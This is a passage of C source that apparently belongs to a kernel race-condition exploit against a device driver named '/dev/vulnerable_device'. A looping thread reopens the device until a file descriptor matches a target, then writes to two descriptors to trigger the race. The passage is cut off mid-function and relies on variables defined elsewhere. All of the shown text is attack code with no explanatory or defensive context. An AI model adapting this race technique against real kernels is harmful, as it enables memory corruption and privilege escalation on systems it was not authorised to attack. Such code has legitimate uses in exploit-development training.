     int win = 0;

     void* race_fd(void *arg) {
         while (1) {
             while (!win) {
                 int fd = open("/dev/vulnerable_device", O_RDWR);
                 if (fd == fd2) {
                     win = 1;
                 }
                 if (win == 0 && fd == fd1) {
                     close(fd);
                 }
             }
             // Attempt to write to both file descriptors
             if (write(fd1, "A", 1) != 1 || write(fd2, "a", 1) != 1) {
                 close(fd1);
                 close(fd2);
                 win = 0;
             } else {
